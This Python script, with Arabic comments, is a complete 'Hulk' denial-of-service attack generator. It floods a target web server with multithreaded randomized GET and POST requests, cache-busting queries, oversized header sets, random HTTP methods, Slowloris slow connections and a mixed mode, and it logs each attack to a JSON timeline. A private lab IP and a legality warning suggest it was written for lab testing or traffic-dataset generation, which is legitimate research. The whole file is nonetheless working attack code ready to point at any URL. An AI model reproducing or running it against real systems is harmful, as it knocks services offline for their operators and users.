import threading
import time
import random
import string
import urllib.parse
import urllib.request
import json
from datetime import datetime
import ssl

# ======== CONFIG ========
TARGET_URL = "http://192.168.17.140"
TARGET_PORT = 80
LOG_FILE = "hulk_dos_timeline1.json"

class HulkDoSGenerator:
    """Hulk DoS Attack Generator"""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.attacks = []
        self.requests_sent = 0
        self.stop_attack = False
    
    def log_attack_start(self, attack_type, description):
        """تسجيل بداية الهجوم"""
        self.current_attack = {
            "attack_type": attack_type,
            "description": description,
            "target_url": self.target_url,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        print(f"\n{'='*60}")
        print(f"[+] Attack: {attack_type}")
        print(f"[+] Description: {description}")
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Start: {self.current_attack['start_time']}")
        print(f"{'='*60}\n")
        
        self.stop_attack = False
        self.requests_sent = 0
    
    def log_attack_end(self):
        """تسجيل نهاية الهجوم"""
        self.stop_attack = True
        
        self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_attack['end_timestamp'] = time.time()
        self.current_attack['duration_seconds'] = round(
            self.current_attack['end_timestamp'] - self.current_attack['start_timestamp'], 2
        )
        self.current_attack['requests_sent'] = self.requests_sent
        
        print(f"\n[✓] Attack completed")
        print(f"[✓] Duration: {self.current_attack['duration_seconds']}s")
        print(f"[✓] Requests: {self.requests_sent}\n")
        
        self.attacks.append(self.current_attack)
    
    def save_timeline(self):
        """حفظ الـ timeline"""
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        
        print(f"\n[✓] Timeline saved to: {LOG_FILE}")
        self.print_summary()
    
    def print_summary(self):
        """طباعة ملخص"""
        print("\n" + "="*60)
        print("HULK DoS ATTACK SUMMARY")
        print("="*60)
        
        total_requests = 0
        
        for i, attack in enumerate(self.attacks, 1):
            print(f"\n#{i} - {attack['attack_type']}")
            print(f"   Start: {attack['start_time']}")
            print(f"   Duration: {attack['duration_seconds']}s")
            print(f"   Requests: {attack['requests_sent']}")
            
            total_requests += attack['requests_sent']
        
        print("\n" + "="*60)
        print(f"Total attacks: {len(self.attacks)}")
        print(f"Total requests: {total_requests}")
        print("="*60)


# ======== Helper Functions ========

def random_string(length):
    """توليد string عشوائي"""
    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))


def random_useragent():
    """توليد User-Agent عشوائي"""
    
    # Operating Systems
    os_list = [
        'Windows NT 10.0; Win64; x64',
        'Windows NT 6.1; WOW64',
        'Macintosh; Intel Mac OS X 10_15_7',
        'X11; Linux x86_64',
        'X11; Ubuntu; Linux x86_64',
    ]
    
    # Browsers
    browsers = [
        'Chrome/{}.0.{}.{}'.format(
            random.randint(90, 110),
            random.randint(4000, 5000),
            random.randint(0, 200)
        ),
        'Firefox/{}.0'.format(random.randint(80, 100)),
        'Safari/{}.{}'.format(random.randint(600, 610), random.randint(1, 9)),
        'Edge/{}.0.{}.{}'.format(
            random.randint(90, 110),
            random.randint(1000, 2000),
            random.randint(0, 100)
        ),
    ]
    
    os = random.choice(os_list)
    browser = random.choice(browsers)
    
    return f'Mozilla/5.0 ({os}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}'


def random_referer():
    """توليد Referer عشوائي"""
    referers = [
        'https://www.google.com/search?q=' + random_string(10),
        'https://www.bing.com/search?q=' + random_string(10),
        'https://www.yahoo.com/search?p=' + random_string(10),
        'https://www.facebook.com/',
        'https://www.twitter.com/',
        'https://www.reddit.com/',
        'https://www.youtube.com/',
        'https://www.' + random_string(8) + '.com/',
    ]
    return random.choice(referers)


def random_url_path():
    """توليد URL path عشوائي"""
    paths = [
        '/',
        '/index.html',
        '/index.php',
        '/login',
        '/admin',
        '/search',
        '/api',
        '/home',
        '/products',
        '/contact',
        '/' + random_string(random.randint(5, 15)),
        '/' + random_string(10) + '.php',
        '/' + random_string(8) + '.html',
    ]
    return random.choice(paths)


def random_query_params():
    """توليد Query Parameters عشوائية"""
    params = {}
    
    num_params = random.randint(0, 5)
    
    for _ in range(num_params):
        key = random_string(random.randint(3, 10))
        value = random_string(random.randint(5, 20))
        params[key] = value
    
    return urllib.parse.urlencode(params)


# ======== 1. Classic Hulk Attack ========
def hulk_classic(attacker, duration=30, threads=50):
    """Classic Hulk - Random URLs, Headers, User-Agents"""
    attacker.log_attack_start("HULK_CLASSIC", "Classic Hulk with randomized requests")
    
    def hulk_worker():
        """Worker thread للـ Hulk attack"""
        
        # تجاهل SSL errors
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        while not attacker.stop_attack:
            try:
                # بناء URL عشوائي
                path = random_url_path()
                params = random_query_params()
                
                if params:
                    url = f"{attacker.target_url}{path}?{params}"
                else:
                    url = f"{attacker.target_url}{path}"
                
                # Headers عشوائية
                headers = {
                    'User-Agent': random_useragent(),
                    'Accept': '*/*',
                    'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar-EG,ar;q=0.9', 'fr-FR,fr;q=0.9']),
                    'Accept-Encoding': 'gzip, deflate',
                    'Referer': random_referer(),
                    'Connection': random.choice(['keep-alive', 'close']),
                    'Cache-Control': random.choice(['no-cache', 'max-age=0']),
                }
                
                # إرسال الطلب
                req = urllib.request.Request(url, headers=headers)
                response = urllib.request.urlopen(req, timeout=3, context=ctx)
                response.read()
                response.close()
                
                attacker.requests_sent += 1
                
            except Exception as e:
                pass  # تجاهل الأخطاء
            
            time.sleep(0.01)
    
    # إطلاق الـ threads
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=hulk_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    # الانتظار
    time.sleep(duration)
    
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 2. GET Flood ========
def hulk_get_flood(attacker, duration=30, threads=50):
    """GET Flood - GET requests متواصلة"""
    attacker.log_attack_start("HULK_GET_FLOOD", "Massive GET request flood")
    
    def get_worker():
        """Worker للـ GET flood"""
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        while not attacker.stop_attack:
            try:
                # GET request بسيط
                path = random_url_path()
                url = f"{attacker.target_url}{path}"
                
                headers = {
                    'User-Agent': random_useragent(),
                    'Connection': 'keep-alive',
                }
                
                req = urllib.request.Request(url, headers=headers, method='GET')
                response = urllib.request.urlopen(req, timeout=2, context=ctx)
                response.close()
                
                attacker.requests_sent += 1
                
            except:
                pass
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=get_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 3. POST Flood ========
def hulk_post_flood(attacker, duration=30, threads=40):
    """POST Flood - POST requests بـ data عشوائية"""
    attacker.log_attack_start("HULK_POST_FLOOD", "POST request flood with random data")
    
    def post_worker():
        """Worker للـ POST flood"""
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        while not attacker.stop_attack:
            try:
                path = random_url_path()
                url = f"{attacker.target_url}{path}"
                
                # بيانات POST عشوائية
                post_data = {}
                for _ in range(random.randint(3, 10)):
                    key = random_string(random.randint(5, 15))
                    value = random_string(random.randint(10, 50))
                    post_data[key] = value
                
                data = urllib.parse.urlencode(post_data).encode()
                
                headers = {
                    'User-Agent': random_useragent(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': str(len(data)),
                }
                
                req = urllib.request.Request(url, data=data, headers=headers, method='POST')
                response = urllib.request.urlopen(req, timeout=2, context=ctx)
                response.close()
                
                attacker.requests_sent += 1
                
            except:
                pass
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=post_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 4. Cache Bypass ========
def hulk_cache_bypass(attacker, duration=30, threads=40):
    """Cache Bypass - تجنب الـ cache بـ random params"""
    attacker.log_attack_start("HULK_CACHE_BYPASS", "Cache-busting attack")
    
    def cache_bypass_worker():
        """Worker لتجنب الـ cache"""
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        while not attacker.stop_attack:
            try:
                path = random_url_path()
                
                # إضافة random timestamp لتجنب cache
                timestamp = int(time.time() * 1000)
                random_param = random_string(8)
                
                url = f"{attacker.target_url}{path}?_={timestamp}&{random_param}={random_string(10)}"
                
                headers = {
                    'User-Agent': random_useragent(),
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Expires': '0',
                }
                
                req = urllib.request.Request(url, headers=headers)
                response = urllib.request.urlopen(req, timeout=2, context=ctx)
                response.close()
                
                attacker.requests_sent += 1
                
            except:
                pass
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=cache_bypass_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 5. Header Bomb ========
def hulk_header_bomb(attacker, duration=30, threads=30):
    """Header Bomb - Headers كثيرة وكبيرة"""
    attacker.log_attack_start("HULK_HEADER_BOMB", "Massive header injection")
    
    def header_bomb_worker():
        """Worker بـ headers كبيرة"""
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        while not attacker.stop_attack:
            try:
                url = f"{attacker.target_url}{random_url_path()}"
                
                # إنشاء headers كثيرة
                headers = {
                    'User-Agent': random_useragent(),
                }
                
                # إضافة headers عشوائية كثيرة
                for i in range(random.randint(20, 50)):
                    key = f'X-{random_string(10)}'
                    value = random_string(random.randint(50, 200))
                    headers[key] = value
                
                req = urllib.request.Request(url, headers=headers)
                response = urllib.request.urlopen(req, timeout=2, context=ctx)
                response.close()
                
                attacker.requests_sent += 1
                
            except:
                pass
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=header_bomb_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 6. Random Method Attack ========
def hulk_random_methods(attacker, duration=30, threads=40):
    """Random HTTP Methods"""
    attacker.log_attack_start("HULK_RANDOM_METHODS", "Random HTTP method flood")
    
    def random_method_worker():
        """Worker بـ HTTP methods عشوائية"""
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE']
        
        while not attacker.stop_attack:
            try:
                url = f"{attacker.target_url}{random_url_path()}"
                method = random.choice(methods)
                
                headers = {
                    'User-Agent': random_useragent(),
                }
                
                if method in ['POST', 'PUT', 'PATCH']:
                    data = random_string(random.randint(100, 500)).encode()
                    req = urllib.request.Request(url, data=data, headers=headers, method=method)
                else:
                    req = urllib.request.Request(url, headers=headers, method=method)
                
                response = urllib.request.urlopen(req, timeout=2, context=ctx)
                response.close()
                
                attacker.requests_sent += 1
                
            except:
                pass
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=random_method_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== 7. Slowloris Hulk ========
def hulk_slowloris(attacker, duration=30, connections=200):
    """Slowloris-style attack"""
    attacker.log_attack_start("HULK_SLOWLORIS", "Slow HTTP request attack")
    
    import socket
    
    sockets_list = []
    
    def create_socket():
        """إنشاء اتصال بطيء"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            
            # استخراج host و port من URL
            if '://' in attacker.target_url:
                host = attacker.target_url.split('://')[1].split(':')[0].split('/')[0]
            else:
                host = attacker.target_url.split(':')[0].split('/')[0]
            
            port = TARGET_PORT
            
            sock.connect((host, port))
            
            # إرسال طلب غير مكتمل
            sock.send(f"GET /{random_string(10)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(f"User-Agent: {random_useragent()}\r\n".encode())
            
            return sock
        except:
            return None
    
    # إنشاء اتصالات
    print(f"  [*] Creating {connections} slow connections...")
    for _ in range(connections):
        sock = create_socket()
        if sock:
            sockets_list.append(sock)
            attacker.requests_sent += 1
    
    print(f"  [*] Established {len(sockets_list)} connections")
    
    # إبقاء الاتصالات حية
    end_time = time.time() + duration
    
    while time.time() < end_time:
        print(f"  [{datetime.now().strftime('%H:%M:%S')}] Keeping {len(sockets_list)} alive...")
        
        for sock in list(sockets_list):
            try:
                sock.send(f"X-{random_string(5)}: {random_string(10)}\r\n".encode())
            except:
                sockets_list.remove(sock)
        
        # إعادة ملء
        while len(sockets_list) < connections and time.time() < end_time:
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
                attacker.requests_sent += 1
        
        time.sleep(10)
    
    # إغلاق
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    attacker.log_attack_end()


# ======== 8. Mixed Hulk (All Techniques) ========
def hulk_mixed(attacker, duration=30, threads=50):
    """Mixed Hulk - كل التقنيات مع بعض"""
    attacker.log_attack_start("HULK_MIXED", "Mixed Hulk attack with all techniques")
    
    def mixed_worker():
        """Worker مع تقنيات عشوائية"""
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        while not attacker.stop_attack:
            try:
                # اختيار تقنية عشوائية
                technique = random.choice(['get', 'post', 'cache_bypass', 'header_bomb', 'random_method'])
                
                path = random_url_path()
                url = f"{attacker.target_url}{path}"
                
                headers = {
                    'User-Agent': random_useragent(),
                    'Referer': random_referer(),
                }
                
                if technique == 'get':
                    params = random_query_params()
                    if params:
                        url += f"?{params}"
                    req = urllib.request.Request(url, headers=headers, method='GET')
                    
                elif technique == 'post':
                    data = random_string(random.randint(50, 200)).encode()
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    req = urllib.request.Request(url, data=data, headers=headers, method='POST')
                    
                elif technique == 'cache_bypass':
                    timestamp = int(time.time() * 1000)
                    url += f"?_={timestamp}&{random_string(8)}={random_string(10)}"
                    headers['Cache-Control'] = 'no-cache'
                    req = urllib.request.Request(url, headers=headers)
                    
                elif technique == 'header_bomb':
                    for i in range(random.randint(10, 30)):
                        headers[f'X-{random_string(8)}'] = random_string(50)
                    req = urllib.request.Request(url, headers=headers)
                    
                elif technique == 'random_method':
                    method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS'])
                    req = urllib.request.Request(url, headers=headers, method=method)
                
                response = urllib.request.urlopen(req, timeout=2, context=ctx)
                response.close()
                
                attacker.requests_sent += 1
                
            except:
                pass
            
            time.sleep(random.uniform(0.001, 0.02))
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=mixed_worker, daemon=True)
        t.start()
        threads_list.append(t)
    
    time.sleep(duration)
    attacker.log_attack_end()
    
    for t in threads_list:
        t.join(timeout=2)


# ======== MAIN ========
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Hulk DoS Attack Generator')
    parser.add_argument('-u', '--url', required=True, 
                       help='Target URL (e.g., http://192.168.17.138)')
    parser.add_argument('-d', '--duration', type=int, default=30,
                       help='Attack duration per type (seconds)')
    parser.add_argument('-a', '--attack',
                       choices=['classic', 'get', 'post', 'cache', 'header', 
                               'methods', 'slowloris', 'mixed', 'all'],
                       default='all',
                       help='Attack type')
    
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("HULK DoS ATTACK GENERATOR")
    print("="*60)
    print(f"Target: {args.url}")
    print(f"Attack: {args.attack}")
    print(f"Duration: {args.duration}s per attack")
    print(f"Timeline: {LOG_FILE}")
    print("="*60 + "\n")
    
    print("⚠️  WARNING: DoS attacks are ILLEGAL!")
    print("⚠️  Use only in authorized environments!\n")
    
    input("Press ENTER to start attacks...")
    
    attacker = HulkDoSGenerator(args.url)
    
    try:
        if args.attack == 'classic':
            hulk_classic(attacker, args.duration)
        elif args.attack == 'get':
            hulk_get_flood(attacker, args.duration)
        elif args.attack == 'post':
            hulk_post_flood(attacker, args.duration)
        elif args.attack == 'cache':
            hulk_cache_bypass(attacker, args.duration)
        elif args.attack == 'header':
            hulk_header_bomb(attacker, args.duration)
        elif args.attack == 'methods':
            hulk_random_methods(attacker, args.duration)
        elif args.attack == 'slowloris':
            hulk_slowloris(attacker, args.duration)
        elif args.attack == 'mixed':
            hulk_mixed(attacker, args.duration)
        elif args.attack == 'all':
            attacks = [
                ('Classic Hulk', hulk_classic),
                ('GET Flood', hulk_get_flood),
                ('POST Flood', hulk_post_flood),
                ('Cache Bypass', hulk_cache_bypass),
                ('Header Bomb', hulk_header_bomb),
                ('Random Methods', hulk_random_methods),
                ('Slowloris', hulk_slowloris),
                ('Mixed Hulk', hulk_mixed),
            ]
            
            for name, attack_func in attacks:
                print(f"\n>>> Starting {name} <<<")
                attack_func(attacker, args.duration)
                print(f"\n[*] Waiting 10 seconds...\n")
                time.sleep(10)
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()
        
        print("\n[✓] All attacks completed!")


if __name__ == "__main__":
    main()
